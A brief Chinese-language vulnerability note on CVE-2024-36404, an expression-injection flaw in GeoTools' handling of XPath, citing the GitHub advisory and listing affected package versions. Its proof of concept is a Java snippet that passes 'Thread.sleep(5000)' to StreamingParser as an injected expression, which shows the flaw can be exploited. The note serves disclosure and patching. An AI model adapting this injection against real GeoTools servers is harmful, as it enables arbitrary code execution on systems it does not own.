# CVE-2024-36404

>GeoTools是一个用于处理地理空间数据的开源代码库，并且支持OGC过滤器表达式语言的解析和编码。

## 来源

[https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w](https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w)

## 简介

GeoTools的受影响版本在处理用户输入的XPATH表达式时未做处理直接传递给了commons-jxpath库进行解析，由于commons-jxpath可以执行任意代码，从而导致任意代码执行漏洞。

## 漏洞类型

表达式注入

## 影响范围

-   30.0 <= org.geotools:gt-complex < 30.4
-   org.geotools:gt-complex < 29.6
-   31.0 <= org.geotools:gt-app-schema < 31.2
-   30.0 <= org.geotools.xsd:gt-xsd-core < 30.4
-   30.0 <= org.geotools:gt-app-schema < 30.4
-   org.geotools:gt-app-schema < 29.6
-   31.0 <= org.geotools.xsd:gt-xsd-core < 31.2
-   org.geotools.xsd:gt-xsd-core < 29.6
-   31.0 <= org.geotools:gt-complex < 31.2

## POC

The following inputs to StreamingParser will delay the response by five seconds:

```java
new org.geotools.xsd.StreamingParser(
	new org.geotools.filter.v1_0.OGCConfiguration(),
	new java.io.ByteArrayInputStream("<Filter></Filter>".getBytes()),
	"java.lang.Thread.sleep(5000)")
    .parse();
```

### 



